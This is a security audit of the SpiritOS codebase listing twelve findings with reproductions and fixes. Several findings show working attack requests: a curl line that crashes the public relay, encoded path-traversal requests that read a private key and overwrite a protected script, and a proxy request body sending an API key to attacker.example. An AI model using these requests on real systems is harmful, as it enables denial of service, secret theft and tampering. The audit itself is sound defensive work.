SpiritOS Boundary Audit

Twelve findings across the HTTP server, the kernel's filesystem gates, the relay, the browser shell and the host scripts. Four were confirmed by running them rather than reasoning from the source. The common thread: every gate in this codebase matches on the request string it was handed, not on the path the filesystem actually resolves.

01

Unauthenticated remote crash on the public relay

Critical Verified E2E

server.js:498 calls decodeURIComponent(url.pathname), which throws URIError on malformed percent-encoding. The throw is uncaught inside the request handler, so the process exits. It runs before the isRelayPublicPath check, so the relay's deliberately narrowed surface offers no protection.

Against a live --relay process
$ curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:65440/
200
$ curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:65440/%zz
000
$ curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:65440/
000                                    # relay is gone

URIError: URI malformed
    at Server.<anonymous> (js/server.js:498:20)

The systemd unit sets Restart=on-failure / RestartSec=3, so a single request costs about three seconds of downtime — but a loop keeps spirit.andyflinn.com off the air indefinitely from one line of curl, re-reading mailbox state on every restart.

FixWrap the decode in try/catch and answer 400. Add process.on('uncaughtException') and server.on('clientError') as backstops so the next parse bug is a bad response, not a dead host.
02

Both filesystem gates are bypassable with non-canonical paths

Critical Verified E2E

fileServable and fileWritable (kernel.js:196–224) pattern-match the raw request string, while fsPath resolves it separately. The two disagree, and the filesystem obeys the second one.

Path as handed to the gateGate's verdictWhat the filesystem resolves
relay-state/identity.jsonBlocked—
./relay-state/identity.jsonServablethe Ed25519 private key
x/../js/relayAuth.jsServablethe signature-verification module
app/natter/natter.jsNot writable—
app/./natter/natter.jsWritablea protected app entry script

Over HTTP the read path survives via encoded slashes: the WHATWG URL parser collapses a literal ../, but %2f reaches decodeURIComponent intact and is only then rejoined into a path.

Read gate — private key served over HTTP
$ curl -s -w "\n[HTTP %{http_code}]\n" \
    "http://localhost:65439/x%2f..%2frelay-state%2fidentity.json"
{"name":"fake","publicKey":"FAKE_PUB","privateKey":"FAKE_PRIVATE_KEY_SENTINEL_12345"}
[HTTP 200]
Write gate — "protected from every tool" entry script overwritten
$ curl -s -w "\n[HTTP %{http_code}]\n" -X POST /api/fs/save \
    -d '{"path":"app/./natter/natter.js","content":"PWNED"}'
[HTTP 204]

$ head -c 40 spirit/run/app/natter/natter.js
PWNED

$ git checkout -- spirit/run/app/natter/natter.js   # restored
working tree clean

Scope, stated plainly: reads stay behind loopback on a personal node, and a --relay never exposes the static route at all — so this is a local boundary failure, not an internet-facing one. But it defeats two invariants the code states outright, including "protected everywhere, from every tool."

Fix — one shape changeResolve with fsPath first, derive the ROOT_DIR-relative forward-slashed path from the result, and run every pattern against that canonical form. One change closes both gates and the whole class.
03

escapeHtml is not attribute-safe

High Verified locally

shell.js:782 escapes by round-tripping through textContent → innerHTML, which handles &, < and > but not quotes — and it is used in roughly thirty attribute contexts. Two of those take input the operator did not write:

Filenames. index.html:474–475 places entry.name and entry.relativePath into data-name="…". A double quote is legal in a POSIX filename.
App name and icon overrides. index.html:1099,1106 place them into value="…" and persist them to preferences.json — itself a writable root file any app can write.

Scoped honestly: apps already share the page's realm, and shell.js's own comment frames api as shrinking what an app sees rather than as a sandbox. So this is stored XSS, not a sandbox escape. The filename vector is the one that matters, because that content arrives from outside.

FixReplace the textContent trick with an explicit replace chain that also covers " and ' — or set those attributes through setAttribute / dataset and stop building them by concatenation.
04

/api/proxy will send your Anthropic key to any host named

High By inspection

PROXY_ENV_SUBSTITUTION_ALLOWLIST gates which environment variable may be substituted, never which destination it may be substituted for.

Request body that exfiltrates the real key
POST /api/proxy
{
  "url": "https://attacker.example",
  "headers": { "x-api-key": "${ENV:ANTHROPIC_API_KEY}" }
}

The code comment's claim — that this cannot "leak an unrelated server env var to an arbitrary URL a caller names" — is true for unrelated variables. The allowlisted one goes wherever it is pointed.

FixMake the allowlist entries pairs, not names: bind ANTHROPIC_API_KEY to api.anthropic.com and substitute only when the outbound URL's host matches.
05

Relay inbox reads are unauthenticated

High By inspection

claim and send are signature-gated in keys mode. inbox takes a bare ?name= and returns that peer's messages to anyone who asks. On a public relay, every mailbox is world-readable by name.

server.js asserts that "the mailbox routes themselves are gated by the allow list and signature checks in relayAuth.js" — accurate for two of the three routes.

FixRequire a signature over the requested name for inbox reads, the same way claim does — or narrow the comment so the gap is on the record rather than papered over.
06

Relay rate limiting is per-name and grows without bound

Moderate By inspection

rateOk keys its buckets on the caller-supplied from, so rotating the name yields a fresh 30-per-minute budget every time. The buckets are never pruned when they empty, so each distinct name permanently costs memory — on a 1 GB relay box.

relayAbuse.test.js exercises a single fixed name and correctly observes the 31st send returning 429, which is why the limit reads as covered.

FixKey limits on the connection's IP as well as the claimed name, and evict buckets once their window empties.
07

A relay with no allow.json boots silently wide open

Moderate By inspection

loadAllow treats a missing or unparseable relay-state/allow.json as mode:'open' — anyone may claim any name, send as anyone, and read anything. The README says to create the file on the host; nothing checks that you did.

The failure mode is invisible: an open relay looks exactly like a working one until someone else claims your name.

FixLog a single unmissable warning when a --relay starts in open mode. Cheap, and it converts a silent default into a visible choice.
08

The relay runs as root, and pulls master every ten minutes

Moderate By inspection

The systemd unit has no User=, so node runs as root, and bash/cron-install hard-resets to origin/master every ten minutes. Anything reaching the GitHub branch is root on the box within ten minutes, with no gate in between.

That is a defensible trade for a single operator who owns both ends — but the process listening on :65430 has no need of root either way.

FixAdd User=spirit, NoNewPrivileges=yes and ProtectSystem=strict with ReadWritePaths= for the relay-state directory. The auto-deploy can stay; the privilege need not.
09

The harness only ever feeds its gates canonical paths

Moderate Verified locally

This is the finding behind finding 02. The suite is real and it passes — pathJail, servableAssets, writableRoots and circularity report 102 successes against the current tree. But every denied path is asserted in exactly one spelling.

The suite, run against the bypassable gate
$ node pathJail.js       ✅:13
$ node servableAssets.js ✅:68
$ node writableRoots.js  ✅:20
$ node circularity.js    ✅:1     — 102 passing

# meanwhile pathJail.js asserts, as a PASS:
#   loadFile('./index.html') !== null
# which is the exact bypass, one directory over.
FixFor each denied path already asserted, assert the non-canonical spellings too: ./x, a/../x, x/., a//x. That table in finding 02 is the test case.
10

A failed fs-watcher becomes an undeletable job

Low By inspection

jobs.js:151 sets status: 'error', which is not in TERMINAL_STATUSES. deleteJob refuses any non-terminal job, so the dead watcher can never be cleared from the Jobs list.

FixUse 'failed', which is already in the set and already rendered.
11

The eleventh open tab warns on the console

Low By inspection

Each SSE connection adds two listeners to jobs.events, which never gets setMaxListeners. Node's default of 10 means a MaxListenersExceededWarning once enough tabs are open — noise that looks like a leak.

FixCall events.setMaxListeners(0) where the emitter is created, with a line saying why it is deliberate.
12

SSE cleanup runs on close but not on error

Low By inspection

handleSseConnection clears its heartbeat and detaches listeners on req.on('close') only. A socket that errors without a clean close leaves the 20-second interval running against a dead response.

FixHoist the teardown into one function and bind it to 'error' as well, guarded so it runs once.

What is already right

  • The path jail itself is correct. fsPath resolves and compares properly; every escape attempt in the suite is genuinely blocked. The problem in 02 sits beside it, not in it.
  • saveAppManifest force-sets owner server-side rather than trusting the caller's JSON — exactly the right instinct, applied at exactly the right layer.
  • The ${ENV:…} placeholder design keeps the API key out of browser-visible code entirely. Finding 04 narrows its destination; the shape is sound.
  • The BOOT_ASSETS carve-out is disciplined: a narrow, documented exception in the static route rather than a hole punched in the general predicate.
  • The comments explain why, not what — including why the defaults were rejected. That is rare, and it is what made this review fast.
  • There is a real harness for the security boundaries at all. Finding 09 is a gap in its inputs, not a case against it. Most projects this size have nothing to extend.

The through-line

Every gate here is well-reasoned, and every one of them matches on an unvalidated input string. The kernel already knows how to canonicalize — fsPath does it correctly, three lines away. Canonicalize once, then check, and finding 02 closes along with the whole class of bypasses that has not been found yet.
